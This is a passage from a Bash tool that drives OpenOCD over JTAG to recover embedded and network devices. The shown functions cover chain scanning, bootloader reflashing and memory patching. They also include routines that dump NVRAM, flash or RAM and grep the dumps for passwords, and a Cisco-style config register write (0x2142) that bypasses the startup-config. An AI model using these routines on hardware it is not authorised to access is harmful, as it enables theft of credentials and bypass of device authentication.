    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ]; then
        log_message "ERROR" "JTAG adapter not set."
        echo "ERROR: Please configure the JTAG adapter first."
        sleep 3
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"

    echo "Detecting JTAG TAPs in the chain..."
    echo "This will scan for all devices on the JTAG chain."
    echo

    local openocd_cmd=(
        "openocd"
        "-f" "$ocd_interface_cfg"
        "-c" "adapter speed 100"
        "-c" "transport select jtag"
        "-c" "jtag newtap auto0 tap -irlen 4 -expected-id 0"
        "-c" "init"
        "-c" "scan_chain"
        "-c" "exit"
    )

    log_message "INFO" "Running JTAG TAP detection..."
    log_message "CMD" "${openocd_cmd[*]}"

    local tap_output
    if tap_output=$("${openocd_cmd[@]}" 2>&1); then
        log_message "INFO" "TAP detection output: $tap_output"
        echo "------- TAP Detection Results -------"
        echo "$tap_output" | grep -E "(Info|TapName|IR length|IDCODE)" || echo "$tap_output"
        echo "-------------------------------------"

        # Extract and display IDCODE if found
        if echo "$tap_output" | grep -q "IDCODE"; then
            echo
            echo "Device IDCODE(s) detected:"
            echo "$tap_output" | grep "IDCODE"
        fi
    else
        log_message "ERROR" "TAP detection failed: $tap_output"
        echo "ERROR: TAP detection failed."
        echo "$tap_output"
    fi

    echo
    read -r -p "Press Enter to continue..."
}

jtag_interactive_console() {
    print_header
    echo "--- Interactive OpenOCD Console ---"
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure both JTAG adapter and target architecture."
        sleep 3
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    echo "Starting OpenOCD server..."
    echo "Once started, you can connect via telnet on port 4444"
    echo
    echo "Useful commands:"
    echo "  halt              - Halt the target"
    echo "  resume            - Resume execution"
    echo "  reset halt        - Reset and halt"
    echo "  mdw <addr> <count> - Read memory (word)"
    echo "  mww <addr> <value> - Write memory (word)"
    echo "  reg               - Display registers"
    echo "  shutdown          - Exit OpenOCD"
    echo
    echo "Press Ctrl+C to stop the OpenOCD server."
    echo
    read -r -p "Press Enter to start OpenOCD server..."

    log_message "INFO" "Starting interactive OpenOCD console"

    # Start OpenOCD in the foreground
    openocd -f "$ocd_interface_cfg" -f "$ocd_target_cfg" 2>&1 | tee -a "$LOG_FILE"

    echo
    echo "OpenOCD server stopped."
    read -r -p "Press Enter to continue..."
}

jtag_password_recovery() {
    print_header
    echo "--- JTAG-Based Password Recovery ---"
    echo
    echo "This feature attempts to recover or reset device passwords"
    echo "by manipulating configuration memory via JTAG."
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure JTAG adapter and target architecture."
        sleep 3
        return
    fi

    echo "Select recovery method:"
    echo "  1) Extract and analyze NVRAM for credentials"
    echo "  2) Patch configuration register (confreg method)"
    echo "  3) Extract full flash and search for passwords"
    echo "  b) Back"
    echo
    read -r -p "Choose an option: " recovery_choice

    case "$recovery_choice" in
        1)
            echo
            read -r -p "Enter NVRAM base address (hex, e.g., 0x1e000000): " nvram_addr
            read -r -p "Enter NVRAM size (bytes, e.g., 65536): " nvram_size
            local nvram_file="${SESSION_DIR}/nvram_dump.bin"

            local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
            local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

            echo "Dumping NVRAM via JTAG..."
            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "dump_image \"$nvram_file\" $nvram_addr $nvram_size"
                "-c" "resume"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "NVRAM dump successful"
                echo "SUCCESS: NVRAM dumped to $nvram_file"
                echo
                echo "Searching for credentials..."
                echo "------- Potential Credentials -------"
                strings "$nvram_file" | grep -iE 'password|secret|user|admin|enable' | head -20
                echo "-------------------------------------"
                echo
                echo "Full NVRAM dump saved to: $nvram_file"
            else
                log_message "ERROR" "NVRAM dump failed: $output"
                echo "ERROR: Failed to dump NVRAM."
            fi
            ;;
        2)
            echo
            echo "This will attempt to set the configuration register to bypass startup-config."
            read -r -p "Enter config register address (hex, e.g., 0x1e000008): " confreg_addr
            read -r -p "Enter bypass value (hex, e.g., 0x2142): " bypass_value

            echo
            echo "WARNING: Writing incorrect values can brick the device!"
            read -r -p "Type 'confirm' to proceed: " confirm

            if [[ "$confirm" != "confirm" ]]; then
                echo "Operation cancelled."
                sleep 2
                return
            fi

            local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
            local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

            echo "Writing configuration register..."
            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "mww $confreg_addr $bypass_value"
                "-c" "resume"
                "-c" "reset"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "Config register write successful"
                echo "SUCCESS: Configuration register updated."
                echo "Device will now boot bypassing startup-config."
                echo "You can configure a new password after reboot."
            else
                log_message "ERROR" "Config register write failed: $output"
                echo "ERROR: Failed to write configuration register."
            fi
            ;;
        3)
            echo
            read -r -p "Enter output file for flash dump: " flash_file

            local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
            local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

            echo "Dumping flash memory..."
            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "flash read_bank 0 \"$flash_file\" 0 0"
                "-c" "resume"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "Flash dump successful"
                echo "SUCCESS: Flash dumped to $flash_file"
                echo
                echo "Searching for passwords in flash..."
                echo "------- Potential Credentials -------"
                strings "$flash_file" | grep -iE 'password|secret|enable|username' | head -30
                echo "-------------------------------------"
            else
                log_message "ERROR" "Flash dump failed: $output"
                echo "ERROR: Failed to dump flash memory."
            fi
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            ;;
    esac

    echo
    read -r -p "Press Enter to continue..."
}

jtag_bootloader_recovery() {
    print_header
    echo "--- JTAG Bootloader Recovery ---"
    echo
    echo "This feature helps recover devices with corrupted bootloaders"
    echo "by writing a new bootloader image via JTAG."
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure JTAG adapter and target architecture."
        sleep 3
        return
    fi

    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo "  WARNING: THIS IS AN EXTREMELY DANGEROUS OPERATION."
    echo "  Writing an incorrect bootloader WILL brick your device."
    echo "  You assume all risk. Ensure you have the correct image."
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo

    read -r -p "Enter the path to the bootloader image (.bin): " bootloader_file

    if [ ! -f "$bootloader_file" ]; then
        log_message "ERROR" "Bootloader file not found: $bootloader_file"
        echo "ERROR: File not found at '$bootloader_file'."
        sleep 2
        return
    fi

    read -r -p "Enter bootloader flash address (hex, e.g., 0x0): " boot_addr

    echo
    echo "Bootloader file: $bootloader_file"
    echo "Target address: $boot_addr"
    echo "Target arch: $TARGET_ARCH"
    echo "JTAG adapter: $JTAG_ADAPTER"
    echo

    read -r -p "Type 'RECOVER' to proceed with bootloader write: " confirm

    if [[ "$confirm" != "RECOVER" ]]; then
        log_message "INFO" "Bootloader recovery cancelled by user."
        echo "Operation cancelled."
        sleep 2
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    echo
    echo "Preparing to write bootloader..."
    echo "This will erase the flash sector and write the new bootloader."
    echo
    read -r -p "Press Enter to continue or Ctrl+C to abort..."

    local openocd_cmd=(
        "openocd"
        "-f" "$ocd_interface_cfg"
        "-f" "$ocd_target_cfg"
        "-c" "init"
        "-c" "halt"
        "-c" "flash erase_sector 0 0 0"
        "-c" "flash write_bank 0 \"$bootloader_file\" $boot_addr"
        "-c" "verify_image \"$bootloader_file\" $boot_addr"
        "-c" "reset run"
        "-c" "exit"
    )

    log_message "CMD" "${openocd_cmd[*]}"
    echo "Writing bootloader via JTAG..."

    if output=$("${openocd_cmd[@]}" 2>&1); then
        log_message "INFO" "Bootloader write successful: $output"
        echo "---"
        echo " SUCCESS: Bootloader written and verified."
        echo " The device has been reset."
        echo " Monitor the serial console for boot messages."
        echo "---"
    else
        log_message "ERROR" "Bootloader write failed: $output"
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        echo "   ERROR: BOOTLOADER WRITE FAILED."
        echo "   The device may be bricked."
        echo "   See log at $LOG_FILE for details."
        echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    fi

    echo
    read -r -p "Press Enter to continue..."
}

jtag_memory_patch() {
    print_header
    echo "--- JTAG Memory Patching ---"
    echo
    echo "This feature allows you to patch memory or flash via JTAG"
    echo "for recovery purposes (e.g., fixing corrupted data, patching configs)."
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure JTAG adapter and target architecture."
        sleep 3
        return
    fi

    echo "Select patch operation:"
    echo "  1) Write single word to memory"
    echo "  2) Write binary patch to memory"
    echo "  3) Fill memory region with pattern"
    echo "  b) Back"
    echo
    read -r -p "Choose an option: " patch_choice

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    case "$patch_choice" in
        1)
            echo
            read -r -p "Enter memory address (hex, e.g., 0x80000000): " mem_addr
            read -r -p "Enter value to write (hex, e.g., 0x12345678): " mem_value

            echo "Writing word $mem_value to address $mem_addr..."

            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "mww $mem_addr $mem_value"
                "-c" "resume"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "Memory write successful"
                echo "SUCCESS: Memory patched."
            else
                log_message "ERROR" "Memory write failed: $output"
                echo "ERROR: Memory patch failed."
            fi
            ;;
        2)
            echo
            read -r -p "Enter binary patch file path: " patch_file

            if [ ! -f "$patch_file" ]; then
                echo "ERROR: File not found."
                sleep 2
                return
            fi

            read -r -p "Enter target address (hex, e.g., 0x80000000): " target_addr

            echo "Writing binary patch to $target_addr..."

            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "load_image \"$patch_file\" $target_addr"
                "-c" "resume"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "Binary patch successful"
                echo "SUCCESS: Binary patch applied."
            else
                log_message "ERROR" "Binary patch failed: $output"
                echo "ERROR: Binary patch failed."
            fi
            ;;
        3)
            echo
            read -r -p "Enter start address (hex, e.g., 0x80000000): " start_addr
            read -r -p "Enter size in bytes: " fill_size
            read -r -p "Enter fill pattern (hex, e.g., 0xFF): " fill_pattern

            echo "WARNING: This will overwrite $fill_size bytes of memory!"
            read -r -p "Type 'confirm' to proceed: " confirm

            if [[ "$confirm" != "confirm" ]]; then
                echo "Operation cancelled."
                sleep 2
                return
            fi

            # Create a temporary file with the pattern
            local pattern_file="${SESSION_DIR}/fill_pattern.bin"
            dd if=/dev/zero bs=1 count="$fill_size" 2>/dev/null | tr '\0' "\x${fill_pattern}" > "$pattern_file"

            echo "Filling memory region..."

            local openocd_cmd=(
                "openocd"
                "-f" "$ocd_interface_cfg"
                "-f" "$ocd_target_cfg"
                "-c" "init"
                "-c" "halt"
                "-c" "load_image \"$pattern_file\" $start_addr"
                "-c" "resume"
                "-c" "exit"
            )

            log_message "CMD" "${openocd_cmd[*]}"

            if output=$("${openocd_cmd[@]}" 2>&1); then
                log_message "INFO" "Memory fill successful"
                echo "SUCCESS: Memory region filled."
            else
                log_message "ERROR" "Memory fill failed: $output"
                echo "ERROR: Memory fill failed."
            fi

            rm -f "$pattern_file"
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            ;;
    esac

    echo
    read -r -p "Press Enter to continue..."
}

jtag_recovery_wizard() {
    print_header
    echo "--- Guided JTAG Recovery Wizard ---"
    echo
    echo "This wizard will guide you through common JTAG recovery scenarios."
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    echo "What is your recovery scenario?"
    echo "  1) Device won't boot (soft-brick recovery)"
    echo "  2) Forgot password (JTAG password reset)"
    echo "  3) Corrupted bootloader"
    echo "  4) Need to extract firmware/config"
    echo "  b) Back"
    echo
    read -r -p "Choose your scenario: " scenario

    case "$scenario" in
        1)
            print_header
            echo "--- Soft-Brick Recovery Wizard ---"
            echo
            echo "Steps for recovering a non-booting device:"
            echo
            echo "1. First, let's verify JTAG connectivity..."
            read -r -p "Press Enter to test connection..."
            jtag_test_connection

            echo
            echo "2. Next, we'll try to halt the CPU and examine the state..."
            echo "   You can use the interactive console for this."
            read -r -p "Launch interactive console? (y/n): " launch_console
            if [[ "$launch_console" == "y" ]]; then
                jtag_interactive_console
            fi

            echo
            echo "3. Common recovery steps:"
            echo "   - Extract current flash/bootloader for analysis"
            echo "   - Check if bootloader is corrupted"
            echo "   - Re-flash known-good firmware"
            echo
            read -r -p "Would you like to extract the current flash? (y/n): " extract_flash
            if [[ "$extract_flash" == "y" ]]; then
                exploit_via_jtag "extract_flash"
            fi
            ;;
        2)
            print_header
            echo "--- JTAG Password Reset Wizard ---"
            echo
            echo "We'll attempt to reset/recover passwords via JTAG."
            echo
            read -r -p "Press Enter to start password recovery..."
            jtag_password_recovery
            ;;
        3)
            print_header
            echo "--- Bootloader Recovery Wizard ---"
            echo
            echo "WARNING: Bootloader recovery is dangerous!"
            echo "Make sure you have:"
            echo "  - The correct bootloader image for your device"
            echo "  - Verified JTAG connectivity"
            echo "  - Backed up existing flash (if possible)"
            echo
            read -r -p "Continue with bootloader recovery? (y/n): " continue_boot
            if [[ "$continue_boot" == "y" ]]; then
                jtag_bootloader_recovery
            fi
            ;;
        4)
            print_header
            echo "--- Firmware/Config Extraction Wizard ---"
            echo
            echo "What would you like to extract?"
            echo "  1) Full flash memory"
            echo "  2) RAM dump"
            echo "  3) NVRAM (configuration)"
            echo
            read -r -p "Choose option: " extract_option

            case "$extract_option" in
                1) exploit_via_jtag "extract_flash" ;;
                2) exploit_via_jtag "dump_ram" ;;
                3)
                    read -r -p "Enter NVRAM address (hex): " nvram_addr
                    read -r -p "Enter NVRAM size (bytes): " nvram_size
                    # This would call a custom extraction
                    echo "Extracting NVRAM..."
                    ;;
            esac
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            ;;
    esac

    echo
    read -r -p "Press Enter to return to menu..."
}

jtag_auto_boot_interrupt() {
    print_header
    echo "--- Automated Boot Interception ---"
    echo
    echo "This module will monitor the device and automatically interrupt"
    echo "the boot process, then guide you through recovery options."
    echo

    if ! command -v openocd &> /dev/null; then
        log_message "ERROR" "'openocd' not found."
        echo "ERROR: 'openocd' is not installed."
        sleep 3
        return
    fi

    if [ "$JTAG_ADAPTER" == "auto" ] || [ "$TARGET_ARCH" == "auto" ]; then
        log_message "ERROR" "JTAG adapter or target architecture not set."
        echo "ERROR: Please configure JTAG adapter and target architecture first."
        sleep 3
        return
    fi

    echo "Configuration:"
    echo "  Platform: $PLATFORM"
    echo "  JTAG Adapter: $JTAG_ADAPTER"
    echo "  Architecture: $TARGET_ARCH"
    echo
    echo "This will:"
    echo "  1. Start OpenOCD and connect to the device"
    echo "  2. Wait for boot activity (or power cycle if needed)"
    echo "  3. Automatically halt the CPU early in boot"
    echo "  4. Present recovery options"
    echo
    read -r -p "Continue? (y/n): " continue_choice

    if [[ "$continue_choice" != "y" ]]; then
        echo "Operation cancelled."
        sleep 1
        return
    fi

    local ocd_interface_cfg="${OPENOCD_SCRIPT_PATH}/interface/${JTAG_ADAPTER}.cfg"
    local ocd_target_cfg="${OPENOCD_SCRIPT_PATH}/target/swj-dp.cfg"

    # Create temporary OpenOCD script for boot interception
    local ocd_script="${SESSION_DIR}/boot_intercept.cfg"
    cat > "$ocd_script" <<- 'OCDEOF'
# Boot interception script
proc boot_intercept {} {
    echo "=== Boot Interception Active ==="
    echo "Waiting for device to start booting..."
    echo "Power cycle the device now if it's not already running."
    echo ""

    # Try to connect and halt
    if {[catch {init} err]} {
        echo "Init failed: $err"
        echo "Retrying in 2 seconds..."
        after 2000
        if {[catch {init} err2]} {
            echo "Second init attempt failed: $err2"
            return
        }
    }

    echo "Connected to device via JTAG."
    echo "Waiting 3 seconds for boot to start..."
    after 3000

    # Attempt to halt the CPU
    echo "Attempting to halt CPU..."
    if {[catch {halt} err]} {
        echo "First halt attempt failed: $err"
        echo "Retrying..."
        after 1000
        if {[catch {halt 1000} err2]} {
            echo "Second halt attempt failed: $err2"
        } else {
            echo "*** CPU HALTED ***"
        }
    } else {
        echo "*** CPU HALTED ***"
    }

    # Display CPU state
    echo ""
    echo "=== Current CPU State ==="
    if {[catch {reg} err]} {
        echo "Could not read registers: $err"
    }

    echo ""
    echo "=== Boot Intercepted Successfully ==="
    echo "The device is now halted and ready for recovery operations."
    echo "OpenOCD telnet server is running on port 4444"
    echo "Use 'telnet localhost 4444' to access the console."
    echo ""
}

# Run the interception
boot_intercept
OCDEOF

    echo
    echo "Starting OpenOCD with boot interception..."
    echo "==================================================="
    log_message "INFO" "Starting automated boot interception"

    # Start OpenOCD in the background
    local openocd_log="${SESSION_DIR}/openocd_boot_intercept.log"
    openocd -f "$ocd_interface_cfg" -f "$ocd_target_cfg" -f "$ocd_script" > "$openocd_log" 2>&1 &
    local openocd_pid=$!

    echo "OpenOCD started (PID: $openocd_pid)"
    echo "Monitoring boot process..."
    echo
    echo "*** POWER CYCLE THE DEVICE NOW ***"
    echo
    echo "Waiting for boot interception (timeout: 30 seconds)..."

    # Wait and monitor the log
    local timeout=30
    local elapsed=0
    local halted=0

    while [ $elapsed -lt $timeout ]; do
        if grep -q "CPU HALTED" "$openocd_log" 2>/dev/null; then
            halted=1
            break
        fi

        if ! kill -0 $openocd_pid 2>/dev/null; then
            echo "ERROR: OpenOCD process died unexpectedly."
            log_message "ERROR" "OpenOCD process terminated during boot interception"
            cat "$openocd_log"
            read -r -p "Press Enter to continue..."
            return
        fi

        sleep 1
        elapsed=$((elapsed + 1))

        # Show progress
        if [ $((elapsed % 5)) -eq 0 ]; then
            echo "Still waiting... ($elapsed seconds elapsed)"
        fi
    done

    if [ $halted -eq 1 ]; then
        echo
        echo "==================================================="
        echo "*** BOOT SUCCESSFULLY INTERCEPTED ***"
        echo "==================================================="
        echo
        log_message "INFO" "Boot interception successful"

        # Show the boot intercept menu
        jtag_post_interrupt_menu "$openocd_pid"
    else
        echo
        echo "==================================================="
        echo "WARNING: Boot interception timed out."
        echo "The device may not have booted or JTAG connection failed."
        echo "==================================================="
        log_message "WARN" "Boot interception timeout"
        echo
        echo "OpenOCD is still running. Check the log:"
        tail -20 "$openocd_log"
        echo
        read -r -p "Kill OpenOCD? (y/n): " kill_choice
        if [[ "$kill_choice" == "y" ]]; then
            kill $openocd_pid 2>/dev/null
            echo "OpenOCD terminated."
        fi
    fi

    read -r -p "Press Enter to continue..."
}

jtag_post_interrupt_menu() {
    local openocd_pid="$1"

    while true; do
        print_header
        echo "--- Post-Interrupt Recovery Menu ---"
        echo
        echo "  Device Status: HALTED via JTAG"
        echo "  OpenOCD PID: $openocd_pid (telnet port 4444)"
        echo "  Platform: $PLATFORM"
        echo
        echo "=== Recovery Options ==="
        echo "  1) Password Reset (NVRAM Method)"
        echo "  2) Password Reset (Config Register Method)"
        echo "  3) Dump Firmware/Flash"
        echo "  4) Dump RAM"
        echo "  5) Extract NVRAM Configuration"
        echo "  6) Manual OpenOCD Console (telnet)"
        echo "  7) Examine Registers & Memory"
        echo "  8) Resume Boot (Exit Recovery)"
        echo "  9) Power Off Device (Keep Halted)"
        echo "  b) Kill OpenOCD & Return"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1)
                # Password reset via NVRAM
                print_header
                echo "--- Password Reset: NVRAM Method ---"
                echo
                echo "This will dump NVRAM and search for credentials."
                echo
                read -r -p "Enter NVRAM base address (hex, e.g., 0x1e000000): " nvram_addr
                read -r -p "Enter NVRAM size (bytes, e.g., 65536): " nvram_size
                local nvram_file="${SESSION_DIR}/nvram_boot_intercept.bin"

                echo
                echo "Dumping NVRAM via telnet to OpenOCD..."

                # Use telnet to send commands to OpenOCD
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "dump_image \"$nvram_file\" $nvram_addr $nvram_size"
                    sleep 2
                    echo "exit"
                } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/nvram_dump_output.log"

                if [ -f "$nvram_file" ]; then
                    echo
                    echo "SUCCESS: NVRAM dumped to $nvram_file"
                    echo
                    echo "Searching for credentials..."
                    echo "------- Potential Credentials -------"
                    strings "$nvram_file" | grep -iE 'password|secret|user|admin|enable|cisco' | head -30
                    echo "-------------------------------------"
                    log_message "INFO" "NVRAM dump successful via boot intercept"
                else
                    echo "ERROR: NVRAM dump failed. Check OpenOCD output."
                fi

                read -r -p "Press Enter to continue..."
                ;;
            2)
                # Password reset via config register
                print_header
                echo "--- Password Reset: Config Register Method ---"
                echo
                echo "This will modify the configuration register to bypass"
                echo "the startup-config on next boot (confreg 0x2142)."
                echo
                read -r -p "Enter config register address (hex, e.g., 0x2102000): " confreg_addr
                echo
                echo "Common bypass values:"
                echo "  Cisco ISR/Router: 0x2142"
                echo "  Other: Check device documentation"
                echo
                read -r -p "Enter bypass value (hex, e.g., 0x2142): " bypass_value

                echo
                echo "WARNING: Writing incorrect values can brick the device!"
                read -r -p "Type 'CONFIRM' to proceed: " confirm

                if [[ "$confirm" != "CONFIRM" ]]; then
                    echo "Operation cancelled."
                    sleep 2
                    continue
                fi

                echo
                echo "Writing configuration register via OpenOCD..."

                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "mww $confreg_addr $bypass_value"
                    sleep 1
                    echo "mdw $confreg_addr 1"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/confreg_output.log"

                echo
                echo "Configuration register write completed."
                echo "You can now resume boot (option 8) and the device"
                echo "will bypass startup-config, allowing password reset."

                log_message "INFO" "Config register modified via boot intercept"
                read -r -p "Press Enter to continue..."
                ;;
            3)
                # Dump firmware/flash
                print_header
                echo "--- Dump Firmware/Flash ---"
                echo
                read -r -p "Enter output file path: " flash_file
                read -r -p "Enter flash base address (hex, e.g., 0x0): " flash_addr
                read -r -p "Enter size to dump (bytes, e.g., 16777216): " flash_size

                echo
                echo "Dumping flash memory..."

                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "dump_image \"$flash_file\" $flash_addr $flash_size"
                    sleep 5
                    echo "exit"
                } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/flash_dump_output.log"

                if [ -f "$flash_file" ]; then
                    echo
                    echo "SUCCESS: Flash dumped to $flash_file"
                    echo "File size: $(du -h "$flash_file" | cut -f1)"
                    log_message "INFO" "Flash dump successful via boot intercept: $flash_file"
                else
                    echo "ERROR: Flash dump failed."
                fi

                read -r -p "Press Enter to continue..."
                ;;
            4)
                # Dump RAM
                print_header
                echo "--- Dump RAM ---"
                echo
                read -r -p "Enter output file path: " ram_file
                read -r -p "Enter RAM base address (hex, e.g., 0x80000000): " ram_addr
                read -r -p "Enter size to dump (bytes, e.g., 134217728): " ram_size

                echo
                echo "Dumping RAM..."

                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "dump_image \"$ram_file\" $ram_addr $ram_size"
                    sleep 3
                    echo "exit"
                } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/ram_dump_output.log"

                if [ -f "$ram_file" ]; then
                    echo
                    echo "SUCCESS: RAM dumped to $ram_file"
                    echo "File size: $(du -h "$ram_file" | cut -f1)"
                    log_message "INFO" "RAM dump successful via boot intercept: $ram_file"
                else
                    echo "ERROR: RAM dump failed."
                fi

                read -r -p "Press Enter to continue..."
                ;;
            5)
                # Extract NVRAM configuration
                print_header
                echo "--- Extract NVRAM Configuration ---"
                echo
                echo "This extracts the full NVRAM including startup-config."
                echo
                read -r -p "Enter NVRAM base address (hex, e.g., 0x1e000000): " nvram_addr
                read -r -p "Enter NVRAM size (bytes, e.g., 131072): " nvram_size
                local nvram_file="${SESSION_DIR}/nvram_full_config.bin"

                echo
                echo "Extracting NVRAM configuration..."

                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "dump_image \"$nvram_file\" $nvram_addr $nvram_size"
                    sleep 2
                    echo "exit"
                } | telnet localhost 4444 2>&1

                if [ -f "$nvram_file" ]; then
                    echo
                    echo "SUCCESS: NVRAM extracted to $nvram_file"
                    echo
                    echo "Searching for configuration data..."
                    echo "------- Configuration Snippets -------"
                    strings "$nvram_file" | grep -E '^(interface|ip|router|line|enable|username|hostname)' | head -50
                    echo "--------------------------------------"
                    echo
                    echo "Full NVRAM saved to: $nvram_file"
                    log_message "INFO" "NVRAM configuration extracted via boot intercept"
                else
                    echo "ERROR: NVRAM extraction failed."
                fi

                read -r -p "Press Enter to continue..."
                ;;
            6)
                # Manual console
                print_header
                echo "--- Manual OpenOCD Console ---"
                echo
                echo "OpenOCD telnet server is running on localhost:4444"
                echo
                echo "Useful commands:"
                echo "  halt              - Halt the CPU"
                echo "  resume            - Resume execution"
                echo "  reset halt        - Reset and halt"
                echo "  reg               - Display registers"
                echo "  mdw <addr> <cnt>  - Read memory (word)"
                echo "  mww <addr> <val>  - Write memory (word)"
                echo "  dump_image <file> <addr> <size> - Dump memory"
                echo "  load_image <file> <addr> - Load to memory"
                echo "  step              - Single step"
                echo
                echo "Connecting to telnet console..."
                echo "Type 'exit' or Ctrl+] then 'quit' to return."
                echo
                read -r -p "Press Enter to connect..."

                telnet localhost 4444

                echo
                echo "Disconnected from OpenOCD console."
                read -r -p "Press Enter to continue..."
                ;;
            7)
                # Examine registers & memory
                print_header
                echo "--- Examine Registers & Memory ---"
                echo
                echo "Retrieving CPU state..."

                local exam_output="${SESSION_DIR}/examination_output.log"
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "reg"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1 | tee "$exam_output"

                echo
                echo "=== Register Dump ==="
                grep -A 50 "reg" "$exam_output" | head -60
                echo "====================="
                echo

                read -r -p "Examine specific memory address? (y/n): " exam_mem
                if [[ "$exam_mem" == "y" ]]; then
                    read -r -p "Enter address (hex): " exam_addr
                    read -r -p "Enter word count: " exam_count

                    {
                        sleep 1
                        echo "mdw $exam_addr $exam_count"
                        sleep 1
                        echo "exit"
                    } | telnet localhost 4444 2>&1
                fi

                echo
                read -r -p "Press Enter to continue..."
                ;;
            8)
                # Resume boot
                print_header
                echo "--- Resume Boot ---"
                echo
                echo "This will resume device execution and continue booting."
                echo
                read -r -p "Resume now? (y/n): " resume_choice

                if [[ "$resume_choice" == "y" ]]; then
                    echo
                    echo "Resuming device..."

                    {
                        sleep 1
                        echo "resume"
                        sleep 1
                        echo "exit"
                    } | telnet localhost 4444 2>&1

                    echo
                    echo "Device resumed. Boot should continue."
